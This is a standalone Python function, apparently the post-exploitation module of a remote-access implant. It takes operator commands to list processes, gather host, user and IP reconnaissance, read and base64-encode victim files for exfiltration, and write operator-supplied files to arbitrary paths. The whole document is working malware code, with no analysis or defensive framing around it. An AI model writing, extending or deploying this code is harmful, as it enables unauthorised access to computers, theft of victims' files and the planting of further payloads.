def postex(command):
    import os, sys, base64, socket, getpass
    op = command[5:] if str(command).startswith('__px:') else command
    try:
        if op == 'ps':
            import subprocess
            if sys.platform == 'win32':
                out = subprocess.check_output(['tasklist', '/FO', 'CSV', '/NH'], text=True, timeout=15)
                return out[:8000]
            return subprocess.check_output(['ps', '-ax', '-o', 'pid,comm'], text=True, timeout=15)[:8000]
        if op == 'recon':
            host = socket.gethostname()
            user = getpass.getuser()
            cwd = os.getcwd()
            addrs = []
            try:
                addrs.append(socket.gethostbyname(host))
            except Exception:
                pass
            return 'host=%s user=%s cwd=%s addrs=%s' % (host, user, cwd, ','.join(addrs))
        if op.startswith('download:'):
            path = op.split(':', 1)[1]
            if not os.path.isfile(path):
                return 'Error: not a file'
            size = os.path.getsize(path)
            if size > 1024 * 1024:
                return 'Error: file too large'
            data = open(path, 'rb').read()
            return 'FILE:' + base64.b64encode(data).decode()
        if op.startswith('upload:'):
            rest = op.split(':', 1)[1]
            path, _, b64 = rest.partition(':')
            data = base64.b64decode(b64)
            if len(data) > 1024 * 1024:
                return 'Error: file too large'
            parent = os.path.dirname(path)
            if parent:
                os.makedirs(parent, exist_ok=True)
            with open(path, 'wb') as fh:
                fh.write(data)
            return 'uploaded %d bytes' % len(data)
        return 'Error: unknown postex op'
    except Exception as exc:
        return 'Error: %s' % exc
